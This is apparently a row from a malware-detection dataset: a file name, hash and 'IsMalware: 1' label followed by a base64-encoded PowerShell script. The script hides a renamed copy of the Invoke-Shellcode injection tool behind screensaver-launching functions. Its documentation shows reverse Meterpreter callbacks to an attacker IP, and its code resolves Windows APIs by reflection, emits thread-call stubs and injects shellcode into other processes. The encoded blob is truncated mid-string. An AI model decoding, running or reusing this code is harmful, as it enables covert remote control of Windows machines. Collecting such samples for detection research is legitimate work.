scr5.ps1,ccb6c307f95508bf1191c6dff289d8a3,Scan result is 32768. IsMalware: 1,ZnVuY3Rpb24gYQp7CnN0YXJ0ICRlbnY6V0lORElSL1N5c3RlbTMyL1JpYmJvbnMuc2NyIC9zCn0KZnVuY3Rpb24gYgp7CnN0YXJ0ICRlbnY6V0lORElSL1N5c3RlbTMyL3NzVGV4dDNkLnNjciAvcwp9CmZ1bmN0aW9uIGMKewpzdGFydCAkZW52OldJTkRJUi9TeXN0ZW0zMi9NeXN0aWZ5LnNjciAvcwp9CmZ1bmN0aW9uIGQKewpzdGFydCAkZW52OldJTkRJUi9TeXN0ZW0zMi9CdWJibGVzLnNjciAvcwp9CmZ1bmN0aW9uIGUKewpzdGFydCAkZW52OldJTkRJUi9TeXN0ZW0zMi9QaG90b1NjcmVlbnNhdmVyLnNjciAvcwp9CmZ1bmN0aW9uIGYKewpzdGFydCAkZW52OldJTkRJUi9TeXN0ZW0zMi9zY3Juc2F2ZS5zY3IgL3MKfQpmdW5jdGlvbiBzCnsKPCMKLlNZTk9QU0lTCgpJbmplY3Qgc2hlbGxjb2RlIGludG8gdGhlIHByb2Nlc3MgSUQgb2YgeW91ciBjaG9vc2luZyBvciB3aXRoaW4gdGhlIGNvbnRleHQgb2YgdGhlIHJ1bm5pbmcgUG93ZXJTaGVsbCBwcm9jZXNzLgoKUG93ZXJTcGxvaXQgRnVuY3Rpb246IEludm9rZS1TaGVsbGNvZGUKQXV0aG9yOiBNYXR0aGV3IEdyYWViZXIgKEBtYXR0aWZlc3RhdGlvbikKTGljZW5zZTogQlNEIDMtQ2xhdXNlClJlcXVpcmVkIERlcGVuZGVuY2llczogTm9uZQpPcHRpb25hbCBEZXBlbmRlbmNpZXM6IE5vbmUKIAouREVTQ1JJUFRJT04KClBvcnRpb25zIG9mIHRoaXMgcHJvamVjdCB3YXMgYmFzZWQgdXBvbiBzeXJpbmdlLmMgdjEuMiB3cml0dGVuIGJ5IFNwZW5jZXIgTWNJbnR5cmUKClBvd2VyU2hlbGwgZXhwZWN0cyBzaGVsbGNvZGUgdG8gYmUgaW4gdGhlIGZvcm0gMHhYWCwweFhYLDB4WFguIFRvIGdlbmVyYXRlIHlvdXIgc2hlbGxjb2RlIGluIHRoaXMgZm9ybSwgeW91IGNhbiB1c2UgdGhpcyBjb21tYW5kIGZyb20gd2l0aGluIEJhY2t0cmFjayAoVGhhbmtzLCBNYXR0IGFuZCBnMHRtMWxrKToKCm1zZlBsIHdpbmRvd3MvZXhlYyBDTUQ9ImNtZCAvayBjYWxjIiBFWElURlVOQz10aHJlYWQgQyB8IHNlZCAnMSw2ZDtzL1siO10vL2c7cy9cXC8sMC9nJyB8IHRyIC1kICdcbicgfCBjdXQgLWMyLSAKCk1ha2Ugc3VyZSB0byBzcGVjaWZ5ICd0aHJlYWQnIGZvciB5b3VyIGV4aXQgcHJvY2Vzcy4gQWxzbywgZG9uJ3QgYm90aGVyIGVuY29kaW5nIHlvdXIgc2hlbGxjb2RlLiBJdCdzIGVudGlyZWx5IHVubmVjZXNzYXJ5LgogCi5QQVJBTUVURVIgUHJvY2Vzc0lECgpQcm9jZXNzIElEIG9mIHRoZSBwcm9jZXNzIHlvdSB3YW50IHRvIGluamVjdCBzaGVsbGNvZGUgaW50by4KCi5QQVJBTUVURVIgU2hlbGxjb2RlCgpTcGVjaWZpZXMgYW4gb3B0aW9uYWwgc2hlbGxjb2RlIHBhc3NlZCBpbiBhcyBhIGJ5dGUgYXJyYXkKCi5QQVJBTUVURVIgTGlzdE1ldGFzcGxvaXRQbHMKCkxpc3RzIGFsbCBvZiB0aGUgYXZhaWxhYmxlIE1ldGFzcGxvaXQgUGxzIHRoYXQgSW52b2tlLVNoZWxsY29kZSBzdXBwb3J0cwoKLlBBUkFNRVRFUiBICgpTcGVjaWZpZXMgdGhlIElQIGFkZHJlc3Mgb2YgdGhlIGF0dGFjayBtYWNoaW5lIHdhaXRpbmcgdG8gcmVjZWl2ZSB0aGUgcmV2ZXJzZSBzaGVsbAoKLlBBUkFNRVRFUiBPCiAKU3BlY2lmaWVzIHRoZSBwb3J0IG9mIHRoZSBhdHRhY2sgbWFjaGluZSB3YWl0aW5nIHRvIHJlY2VpdmUgdGhlIHJldmVyc2Ugc2hlbGwKCi5QQVJBTUVURVIgUGwKClNwZWNpZmllcyB0aGUgbWV0YXNwbG9pdCBQbCB0byB1c2UuIEN1cnJlbnRseSwgb25seSAnd2luZG93cy9tZXRlcnByZXRlci9yZXZlcnNlX2h0dHAnIGFuZCAncl9odHRwcycgUGxzIGFyZSBzdXBwb3J0ZWQuCgouUEFSQU1FVEVSIFVzZXJBZ2VudAoKT3B0aW9uYWxseSBzcGVjaWZpZXMgdGhlIHVzZXIgYWdlbnQgdG8gdXNlIHdoZW4gdXNpbmcgbWV0ZXJwcmV0ZXIgaHR0cCBvciBodHRwcyBQbHMKCi5QQVJBTUVURVIgRm9yY2UKCkluamVjdHMgc2hlbGxjb2RlIHdpdGhvdXQgcHJvbXB0aW5nIGZvciBjb25maXJtYXRpb24uIEJ5IGRlZmF1bHQsIEludm9rZS1TaGVsbGNvZGUgcHJvbXB0cyBmb3IgY29uZmlybWF0aW9uIGJlZm9yZSBwZXJmb3JtaW5nIGFueSBtYWxpY2lvdXMgYWN0LgoKLkVYQU1QTEUKCkM6XFBTPiBJbnZva2UtU2hlbGxjb2RlIC1Qcm9jZXNzSWQgNDI3NAoKRGVzY3JpcHRpb24KLS0tLS0tLS0tLS0KSW5qZWN0IHNoZWxsY29kZSBpbnRvIHByb2Nlc3MgSUQgNDI3NC4KCi5FWEFNUExFCgpDOlxQUz4gSW52b2tlLVNoZWxsY29kZQoKRGVzY3JpcHRpb24KLS0tLS0tLS0tLS0KSW5qZWN0IHNoZWxsY29kZSBpbnRvIHRoZSBydW5uaW5nIGluc3RhbmNlIG9mIFBvd2VyU2hlbGwuCgouRVhBTVBMRQoKQzpcUFM+IFN0YXJ0LVByb2Nlc3MgQzpcV2luZG93c1xTeXNXT1c2NFxub3RlcGFkLmV4ZSAtV2luZG93U3R5bGUgSGlkZGVuCkM6XFBTPiAkUHJvYyA9IEdldC1Qcm9jZXNzIG5vdGVwYWQKQzpcUFM+IEludm9rZS1TaGVsbGNvZGUgLVByb2Nlc3NJZCAkUHJvYy5JZCAtUGwgcl9odHRwcyAtSCAxOTIuMTY4LjMwLjEyOSAtTyA0NDMgLVZlcmJvc2UKClZFUkJPU0U6IFJlcXVlc3RpbmcgbWV0ZXJwcmV0ZXIgUGwgZnJvbSBodHRwczovLzE5Mi4xNjguMzAuMTI5OjQ0My9JTklUTQpWRVJCT1NFOiBJbmplY3Rpbmcgc2hlbGxjb2RlIGludG8gUElEOiA0MDA0ClZFUkJPU0U6IEluamVjdGluZyBpbnRvIGEgV293NjQgcHJvY2Vzcy4KVkVSQk9TRTogVXNpbmcgMzItYml0IHNoZWxsY29kZS4KVkVSQk9TRTogU2hlbGxjb2RlIG1lbW9yeSByZXNlcnZlZCBhdCAweDAzQkUwMDAwClZFUkJPU0U6IEVtaXR0aW5nIDMyLWJpdCBhc3NlbWJseSBjYWxsIHN0dWIuClZFUkJPU0U6IFRocmVhZCBjYWxsIHN0dWIgbWVtb3J5IHJlc2VydmVkIGF0IDB4MDAxQjAwMDAKVkVSQk9TRTogU2hlbGxjb2RlIGluamVjdGlvbiBjb21wbGV0ZSEKCkRlc2NyaXB0aW9uCi0tLS0tLS0tLS0tCkVzdGFibGlzaGVzIGEgcmV2ZXJzZSBodHRwcyBtZXRlcnByZXRlciBQbCBmcm9tIHdpdGhpbiB0aGUgaGlkZGVuIG5vdGVwYWQgcHJvY2Vzcy4gQSBtdWx0aS1oYW5kbGVyIHdhcyBzZXQgdXAgd2l0aCB0aGUgZm9sbG93aW5nIG9wdGlvbnM6CgpQbCBvcHRpb25zIChyX2h0dHBzKToKCk5hbWUgICAgICBDdXJyZW50IFNldHRpbmcgIFJlcXVpcmVkICBEZXNjcmlwdGlvbgotLS0tICAgICAgLS0tLS0tLS0tLS0tLS0tICAtLS0tLS0tLSAgLS0tLS0tLS0tLS0KRVhJVEZVTkMgIHRocmVhZCAgICAgICAgICAgeWVzICAgICAgIEV4aXQgdGVjaG5pcXVlOiBzZWgsIHRocmVhZCwgcHJvY2Vzcywgbm9uZQpIICAgICAxOTIuMTY4LjMwLjEyOSAgIHllcyAgICAgICBUaGUgbG9jYWwgbGlzdGVuZXIgaG9zdG5hbWUKTyAgICAgNDQzICAgICAgICAgICAgICB5ZXMgICAgICAgVGhlIGxvY2FsIGxpc3RlbmVyIHBvcnQKCi5FWEFNUExFCgpDOlxQUz4gSW52b2tlLVNoZWxsY29kZSAtUGwgcl9odHRwcyAtSCAxOTIuMTY4LjMwLjEyOSAtTyA4MAoKRGVzY3JpcHRpb24KLS0tLS0tLS0tLS0KRXN0YWJsaXNoZXMgYSByZXZlcnNlIGh0dHAgbWV0ZXJwcmV0ZXIgUGwgZnJvbSB3aXRoaW4gdGhlIHJ1bm5pbmcgUHdlclNoZWxsIHByb2Nlc3MuIEEgbXVsdGktaGFuZGxlciB3YXMgc2V0IHVwIHdpdGggdGhlIGZvbGxvd2luZyBvcHRpb25zOgoKUGwgb3B0aW9ucyAod2luZG93cy9tZXRlcnByZXRlci9yZXZlcnNlX2h0dHApOgoKTmFtZSAgICAgIEN1cnJlbnQgU2V0dGluZyAgUmVxdWlyZWQgIERlc2NyaXB0aW9uCi0tLS0gICAgICAtLS0tLS0tLS0tLS0tLS0gIC0tLS0tLS0tICAtLS0tLS0tLS0tLQpFWElURlVOQyAgdGhyZWFkICAgICAgICAgICB5ZXMgICAgICAgRXhpdCB0ZWNobmlxdWU6IHNlaCwgdGhyZWFkLCBwcm9jZXNzLCBub25lCkggICAgIDE5Mi4xNjguMzAuMTI5ICAgeWVzICAgICAgIFRoZSBsb2NhbCBsaXN0ZW5lciBob3N0bmFtZQpPICAgICA4MCAgICAgICAgICAgICAgIHllcyAgICAgICBUaGUgbG9jYWwgbGlzdGVuZXIgcG9ydAoKLkVYQU1QTEUKCkM6XFBTPiBJbnZva2UtU2hlbGxjb2RlIC1TaGVsbGNvZGUgQCgweDkwLDB4OTAsMHhDMykKICAgIApEZXNjcmlwdGlvbgotLS0tLS0tLS0tLQpPdmVycmlkZXMgdGhlIHNoZWxsY29kZSBpbmNsdWRlZCBpbiB0aGUgc2NyaXB0IHdpdGggY3VzdG9tIHNoZWxsY29kZSAtIDB4OTAgKE5PUCksIDB4OTAgKE5PUCksIDB4QzMgKFJFVCkKV2FybmluZzogVGhpcyBzY3JpcHQgaGFzIG5vIHdheSB0byB2YWxpZGF0ZSB0aGF0IHlvdXIgc2hlbGxjb2RlIGlzIDMyIHZzLiA2NC1iaXQhCiAgICAKLkVYQU1QTEUKCkM6XFBTPiBJbnZva2UtU2hlbGxjb2RlIC1MaXN0TWV0YXNwbG9pdFBscwogICAgClBscwotLS0tLS0tLQp3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cApyX2h0dHBzCgouTk9URVMKClVzZSB0aGUgJy1WZXJib3NlJyBvcHRpb24gdG8gcHJpbnQgZGV0YWlsZWQgaW5mb3JtYXRpb24uCgpQbGFjZSB5b3VyIGdlbmVyYXRlZCBzaGVsbGNvZGUgaW4gJFNoZWxsY29kZTMyIGFuZCAkU2hlbGxjb2RlNjQgdmFyaWFibGVzIG9yIHBhc3MgaXQgaW4gYXMgYSBieXRlIGFycmF5IHZpYSB0aGUgJy1TaGVsbGNvZGUnIHBhcmFtZXRlcgoKQmlnIHRoYW5rcyB0byBPaXNpbiAoeDBuKSBHcmVoYW4gKEBvaXNpbmcpIGZvciBhbnN3ZXJpbmcgYWxsIG15IG9ic2N1cmUgcXVlc3Rpb25zIGF0IHRoZSBkcm9wIG9mIGEgaGF0IC0gaHR0cDovL3d3dy5uaXZvdC5vcmcvCgouTElOSwoKaHR0cDovL3d3dy5leHBsb2l0LW1vbmRheS5jb20KIz4KCltDbWRsZXRCaW5kaW5nKCBEZWZhdWx0UGFyYW1ldGVyU2V0TmFtZSA9ICdSdW5Mb2NhbCcsIFN1cHBvcnRzU2hvdWxkUHJvY2VzcyA9ICRUcnVlICwgQ29uZmlybUltcGFjdCA9ICdIaWdoJyldIFBhcmFtICgKICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICBbVUludDE2XQogICAgJFByb2Nlc3NJRCwKICAgIAogICAgW1BhcmFtZXRlciggUGFyYW1ldGVyU2V0TmFtZSA9ICdSdW5Mb2NhbCcgKV0KICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICBbQnl0ZVtdXQogICAgJFNoZWxsY29kZSwKICAgIAogICAgW1BhcmFtZXRlciggUGFyYW1ldGVyU2V0TmFtZSA9ICdNZXRhc3Bsb2l0JyApXQogICAgW1ZhbGlkYXRlU2V0KCAnd2luZG93cy9tZXRlcnByZXRlci9yZXZlcnNlX2h0dHAnLAogICAgICAgICAgICAgICAgICAncl9odHRwcycsCiAgICAgICAgICAgICAgICAgIElnbm9yZUNhc2UgPSAkVHJ1ZSApXQogICAgW1N0cmluZ10KICAgICRQbCA9ICd3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cCcsCiAgICAKICAgIFtQYXJhbWV0ZXIoIFBhcmFtZXRlclNldE5hbWUgPSAnTGlzdFBscycgKV0KICAgIFtTd2l0Y2hdCiAgICAkTGlzdE1ldGFzcGxvaXRQbHMsCiAgICAKICAgIFtQYXJhbWV0ZXIoIE1hbmRhdG9yeSA9ICRUcnVlLAogICAgICAgICAgICAgICAgUGFyYW1ldGVyU2V0TmFtZSA9ICdNZXRhc3Bsb2l0JyApXQogICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgIFtTdHJpbmddCiAgICAkSCA9ICcxMjcuMC4wLjEnLAogICAgCiAgICBbUGFyYW1ldGVyKCBNYW5kYXRvcnkgPSAkVHJ1ZSwKICAgICAgICAgICAgICAgIFBhcmFtZXRlclNldE5hbWUgPSAnTWV0YXNwbG9pdCcgKV0KICAgIFtWYWxpZGF0ZVJhbmdlKCAxLDY1NTM1ICldCiAgICBbSW50XQogICAgJE8gPSA4NDQzLAogICAgCiAgICBbUGFyYW1ldGVyKCBQYXJhbWV0ZXJTZXROYW1lID0gJ01ldGFzcGxvaXQnICldCiAgICBbVmFsaWRhdGVOb3ROdWxsKCldCiAgICBbU3RyaW5nXQogICAgJFVzZXJBZ2VudCA9ICdNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBUcmlkZW50LzUuMCknLAogICAgCiAgICBbU3dpdGNoXQogICAgJEZvcmNlID0gJEZhbHNlCikKCiAgICBTZXQtU3RyaWN0TW9kZSAtVmVyc2lvbiAyLjAKICAgIAogICAgIyBMaXN0IGFsbCBhdmFpbGFibGUgTWV0YXNwbG9pdCBQbHMgYW5kIGV4aXQgdGhlIGZ1bmN0aW9uCiAgICBpZiAoJFBzQ21kbGV0LlBhcmFtZXRlclNldE5hbWUgLWVxICdMaXN0UGxzJykKICAgIHsKICAgICAgICAkQXZhaWxhYmxlUGxzID0gKEdldC1Db21tYW5kIEludm9rZS1TaGVsbGNvZGUpLlBhcmFtZXRlcnNbJ1BsJ10uQXR0cmlidXRlcyB8CiAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7JF8uVHlwZUlkIC1lcSBbU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5WYWxpZGF0ZVNldEF0dHJpYnV0ZV19CiAgICAKICAgICAgICBmb3JlYWNoICgkUGwgaW4gJEF2YWlsYWJsZVBscy5WYWxpZFZhbHVlcykKICAgICAgICB7CiAgICAgICAgICAgIE5ldy1PYmplY3QgUFNPYmplY3QgLVByb3BlcnR5IEB7IFBscyA9ICRQbCB9CiAgICAgICAgfQogICAgICAgIAogICAgICAgIFJldHVybgogICAgfQoKICAgIGlmICggJFBTQm91bmRQYXJhbWV0ZXJzWydQcm9jZXNzSUQnXSApCiAgICB7CiAgICAgICAgIyBFbnN1cmUgYSB2YWxpZCBwcm9jZXNzIElEIHdhcyBwcm92aWRlZAogICAgICAgICMgVGhpcyBjb3VsZCBoYXZlIGJlZW4gdmFsaWRhdGVkIHZpYSAnVmFsaWRhdGVTY3JpcHQnIGJ1dCB0aGUgZXJyb3IgZ2VuZXJhdGVkIHdpdGggR2V0LVByb2Nlc3MgaXMgbW9yZSBkZXNjcmlwdGl2ZQogICAgICAgIEdldC1Qcm9jZXNzIC1JZCAkUHJvY2Vzc0lEIC1FcnJvckFjdGlvbiBTdG9wIHwgT3V0LU51bGwKICAgIH0KICAgIAogICAgZnVuY3Rpb24gTG9jYWw6R2V0LURlbGVnYXRlVHlwZQogICAgewogICAgICAgIFBhcmFtCiAgICAgICAgKAogICAgICAgICAgICBbT3V0cHV0VHlwZShbVHlwZV0pXQogICAgICAgICAgICAKICAgICAgICAgICAgW1BhcmFtZXRlciggUG9zaXRpb24gPSAwKV0KICAgICAgICAgICAgW1R5cGVbXV0KICAgICAgICAgICAgJFBhcmFtZXRlcnMgPSAoTmV3LU9iamVjdCBUeXBlW10oMCkpLAogICAgICAgICAgICAKICAgICAgICAgICAgW1BhcmFtZXRlciggUG9zaXRpb24gPSAxICldCiAgICAgICAgICAgIFtUeXBlXQogICAgICAgICAgICAkUmV0dXJuVHlwZSA9IFtWb2lkXQogICAgICAgICkKCiAgICAgICAgJERvbWFpbiA9IFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluCiAgICAgICAgJER5bkFzc2VtYmx5ID0gTmV3LU9iamVjdCBTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseU5hbWUoJ1JlZmxlY3RlZERlbGVnYXRlJykKICAgICAgICAkQXNzZW1ibHlCdWlsZGVyID0gJERvbWFpbi5EZWZpbmVEeW5hbWljQXNzZW1ibHkoJER5bkFzc2VtYmx5LCBbU3lzdGVtLlJlZmxlY3Rpb24uRW1pdC5Bc3NlbWJseUJ1aWxkZXJBY2Nlc3NdOjpSdW4pCiAgICAgICAgJE1vZHVsZUJ1aWxkZXIgPSAkQXNzZW1ibHlCdWlsZGVyLkRlZmluZUR5bmFtaWNNb2R1bGUoJ0luTWVtb3J5TW9kdWxlJywgJGZhbHNlKQogICAgICAgICRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZVR5cGUoJ015RGVsZWdhdGVUeXBlJywgJ0NsYXNzLCBQdWJsaWMsIFNlYWxlZCwgQW5zaUNsYXNzLCBBdXRvQ2xhc3MnLCBbU3lzdGVtLk11bHRpY2FzdERlbGVnYXRlXSkKICAgICAgICAkQ29uc3RydWN0b3JCdWlsZGVyID0gJFR5cGVCdWlsZGVyLkRlZmluZUNvbnN0cnVjdG9yKCdSVFNwZWNpYWxOYW1lLCBIaWRlQnlTaWcsIFB1YmxpYycsIFtTeXN0ZW0uUmVmbGVjdGlvbi5DYWxsaW5nQ29udmVudGlvbnNdOjpTdGFuZGFyZCwgJFBhcmFtZXRlcnMpCiAgICAgICAgJENvbnN0cnVjdG9yQnVpbGRlci5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKICAgICAgICAkTWV0aG9kQnVpbGRlciA9ICRUeXBlQnVpbGRlci5EZWZpbmVNZXRob2QoJ0ludm9rZScsICdQdWJsaWMsIEhpZGVCeVNpZywgTmV3U2xvdCwgVmlydHVhbCcsICRSZXR1cm5UeXBlLCAkUGFyYW1ldGVycykKICAgICAgICAkTWV0aG9kQnVpbGRlci5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKICAgICAgICAKICAgICAgICBXcml0ZS1PdXRwdXQgJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKQogICAgfQoKICAgIGZ1bmN0aW9uIExvY2FsOkdldC1Qcm9jQWRkcmVzcwogICAgewogICAgICAgIFBhcmFtCiAgICAgICAgKAogICAgICAgICAgICBbT3V0cHV0VHlwZShbSW50UHRyXSldCiAgICAgICAgCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUgKV0KICAgICAgICAgICAgW1N0cmluZ10KICAgICAgICAgICAgJE1vZHVsZSwKICAgICAgICAgICAgCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJFRydWUgKV0KICAgICAgICAgICAgW1N0cmluZ10KICAgICAgICAgICAgJFByb2NlZHVyZQogICAgICAgICkKCiAgICAgICAgIyBHZXQgYSByZWZlcmVuY2UgdG8gU3lzdGVtLmRsbCBpbiB0aGUgR0FDCiAgICAgICAgJFN5c3RlbUFzc2VtYmx5ID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uR2V0QXNzZW1ibGllcygpIHwKICAgICAgICAgICAgV2hlcmUtT2JqZWN0IHsgJF8uR2xvYmFsQXNzZW1ibHlDYWNoZSAtQW5kICRfLkxvY2F0aW9uLlNwbGl0KCdcXCcpWy0xXS5FcXVhbHMoJ1N5c3RlbS5kbGwnKSB9CiAgICAgICAgJFVuc2FmZU5hdGl2ZU1ldGhvZHMgPSAkU3lzdGVtQXNzZW1ibHkuR2V0VHlwZSgnTWljcm9zb2Z0LldpbjMyLlVuc2FmZU5hdGl2ZU1ldGhvZHMnKQogICAgICAgICMgR2V0IGEgcmVmZXJlbmNlIHRvIHRoZSBHZXRNb2R1bGVIYW5kbGUgYW5kIEdldFByb2NBZGRyZXNzIG1ldGhvZHMKICAgICAgICAkR2V0TW9kdWxlSGFuZGxlID0gJFVuc2FmZU5hdGl2ZU1ldGhvZHMuR2V0TWV0aG9kKCdHZXRNb2R1bGVIYW5kbGUnKQogICAgICAgICRHZXRQcm9jQWRkcmVzcyA9ICRVbnNhZmVOYXRpdmVNZXRob2RzLkdldE1ldGhvZCgnR2V0UHJvY0FkZHJlc3MnKQogICAgICAgICMgR2V0IGEgaGFuZGxlIHRvIHRoZSBtb2R1bGUgc3BlY2lmaWVkCiAgICAgICAgJEtlcm4zMkhhbmRsZSA9ICRHZXRNb2R1bGVIYW5kbGUuSW52b2tlKCRudWxsLCBAKCRNb2R1bGUpKQogICAgICAgICR0bXBQdHIgPSBOZXctT2JqZWN0IEludFB0cgogICAgICAgICRIYW5kbGVSZWYgPSBOZXctT2JqZWN0IFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWYoJHRtcFB0ciwgJEtlcm4zMkhhbmRsZSkKICAgICAgICAKICAgICAgICAjIFJldHVybiB0aGUgYWRkcmVzcyBvZiB0aGUgZnVuY3Rpb24KICAgICAgICBXcml0ZS1PdXRwdXQgJEdldFByb2NBZGRyZXNzLkludm9rZSgkbnVsbCwgQChbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZl0kSGFuZGxlUmVmLCAkUHJvY2VkdXJlKSkKICAgIH0KCiAgICAjIEVtaXRzIGEgc2hlbGxjb2RlIHN0dWIgdGhhdCB3aGVuIGluamVjdGVkIHdpbGwgY3JlYXRlIGEgdGhyZWFkIGFuZCBwYXNzIGV4ZWN1dGlvbiB0byB0aGUgbWFpbiBzaGVsbGNvZGUgUGwKICAgIGZ1bmN0aW9uIExvY2FsOkVtaXQtQ2FsbFRocmVhZFN0dWIgKFtJbnRQdHJdICRCYXNlQWRkciwgW0ludFB0cl0gJEV4aXRUaHJlYWRBZGRyLCBbSW50XSAkQXJjaGl0ZWN0dXJlKQogICAgewogICAgICAgICRJbnRTaXplUHRyID0gJEFyY2hpdGVjdHVyZSAvIDgKCiAgICAgICAgZnVuY3Rpb24gTG9jYWw6Q29udmVydFRvLUxpdHRsZUVuZGlhbiAoW0ludFB0cl0gJEFkZHJlc3MpCiAgICAgICAgewogICAgICAgICAgICAkTGl0dGxlRW5kaWFuQnl0ZUFycmF5ID0gTmV3LU9iamVjdCBCeXRlW10oMCkKICAgICAgICAgICAgJEFkZHJlc3MuVG9TdHJpbmcoIlgkKCRJbnRTaXplUHRyKjIpIikgLXNwbGl0ICcoW0EtRjAtOV17Mn0pJyB8IEZvckVhY2gtT2JqZWN0IHsgaWYgKCRfKSB7ICRMaXR0bGVFbmRpYW5CeXRlQXJyYXkgKz0gW0J5dGVdICgnMHh7MH0nIC1mICRfKSB9IH0KICAgICAgICAgICAgW1N5c3RlbS5BcnJheV06OlJldmVyc2UoJExpdHRsZUVuZGlhbkJ5dGVBcnJheSkKICAgICAgICAgICAgCiAgICAgICAgICAgIFdyaXRlLU91dHB1dCAkTGl0dGxlRW5kaWFuQnl0ZUFycmF5CiAgICAgICAgfQogICAgICAgIAogICAgICAgICRDYWxsU3R1YiA9IE5ldy1PYmplY3QgQnl0ZVtdKDApCiAgICAgICAgCiAgICAgICAgaWYgKCRJbnRTaXplUHRyIC1lcSA4KQogICAgICAgIHsKICAgICAgICAgICAgW0J5dGVbXV0gJENhbGxTdHViID0gMHg0OCwweEI4ICAgICAgICAgICAgICAgICAgICAgICMgTU9WICAgUVdPUkQgUkFYLCAmc2hlbGxjb2RlCiAgICAgICAgICAgICRDYWxsU3R1YiArPSBDb252ZXJ0VG8tTGl0dGxlRW5kaWFuICRCYXNlQWRkciAgICAgICAjICZzaGVsbGNvZGUKICAgICAgICAgICAgJENhbGxTdHViICs9IDB4RkYsMHhEMCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgQ0FMTCAgUkFYCiAgICAgICAgICAgICRDYWxsU3R1YiArPSAweDZBLDB4MDAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIFBVU0ggIEJZVEUgMAogICAgICAgICAgICAkQ2FsbFN0dWIgKz0gMHg0OCwweEI4ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBNT1YgICBRV09SRCBSQVgsICZFeGl0VGhyZWFkCiAgICAgICAgICAgICRDYWxsU3R1YiArPSBDb252ZXJ0VG8tTGl0dGxlRW5kaWFuICRFeGl0VGhyZWFkQWRkciAjICZFeGl0VGhyZWFkCiAgICAgICAgICAgICRDYWxsU3R1YiArPSAweEZGLDB4RDAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIENBTEwgIFJBWAogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICBbQnl0ZVtdXSAkQ2FsbFN0dWIgPSAweEI4ICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBNT1YgICBEV09SRCBFQVgsICZzaGVsbGNvZGUKICAgICAgICAgICAgJENhbGxTdHViICs9IENvbnZlcnRUby1MaXR0bGVFbmRpYW4gJEJhc2VBZGRyICAgICAgICMgJnNoZWxsY29kZQogICAgICAgICAgICAkQ2FsbFN0dWIgKz0gMHhGRiwweEQwICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBDQUxMICBFQVgKICAgICAgICAgICAgJENhbGxTdHViICs9IDB4NkEsMHgwMCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgUFVTSCAgQllURSAwCiAgICAgICAgICAgICRDYWxsU3R1YiArPSAweEI4ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIE1PViAgIERXT1JEIEVBWCwgJkV4aXRUaHJlYWQKICAgICAgICAgICAgJENhbGxTdHViICs9IENvbnZlcnRUby1MaXR0bGVFbmRpYW4gJEV4aXRUaHJlYWRBZGRyICMgJkV4aXRUaHJlYWQKICAgICAgICAgICAgJENhbGxTdHViICs9IDB4RkYsMHhEMCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgQ0FMTCAgRUFYCiAgICAgICAgfQogICAgICAgIAogICAgICAgIFdyaXRlLU91dHB1dCAkQ2FsbFN0dWIKICAgIH0KCiAgICBmdW5jdGlvbiBMb2NhbDpJbmplY3QtUmVtb3RlU2hlbGxjb2RlIChbSW50XSAkUHJvY2Vzc0lEKQogICAgewogICAgICAgICMgT3BlbiBhIGhhbmRsZSB0byB0aGUgcHJvY2VzcyB5b3Ugd2FudCB0byBpbmplY3QgaW50bwogICAgICAgICRoUHJvY2VzcyA9ICRPcGVuUHJvY2Vzcy5JbnZva2UoMHgwMDFGMEZGRiwgJGZhbHNlLCAkUHJvY2Vzc0lEKSAjIFByb2Nlc3NBY2Nlc3NGbGFncy5BbGwgKDB4MDAxRjBGRkYpCiAgICAgICAgCiAgICAgICAgaWYgKCEkaFByb2Nlc3MpCiAgICAgICAgewogICAgICAgICAgICBUaHJvdyAiVW5hYmxlIHRvIG9wZW4gYSBwcm9jZXNzIGhhbmRsZSBmb3IgUElEOiAkUHJvY2Vzc0lEIgogICAgICAgIH0KCiAgICAgICAgJElzV293NjQgPSAkZmFsc2UKCiAgICAgICAgaWYgKCQ2NGJpdENQVSkgIyBPbmx5IHBlcmZvcm0gdGhlc2VzIGNoZWNrcyBpZiBDUFUgaXMgNjQtYml0CiAgICAgICAgewogICAgICAgICAgICAjIERldGVybWluZSBpcyB0aGUgcHJvY2VzcyBzcGVjaWZpZWQgaXMgMzIgb3IgNjQgYml0CiAgICAgICAgICAgICRJc1dvdzY0UHJvY2Vzcy5JbnZva2UoJGhQcm9jZXNzLCBbUmVmXSAkSXNXb3c2NCkgfCBPdXQtTnVsbAogICAgICAgICAgICAKICAgICAgICAgICAgaWYgKCghJElzV293NjQpIC1hbmQgJFBvd2VyU2hlbGwzMmJpdCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVGhyb3cgJ1VuYWJsZSB0byBpbmplY3QgNjQtYml0I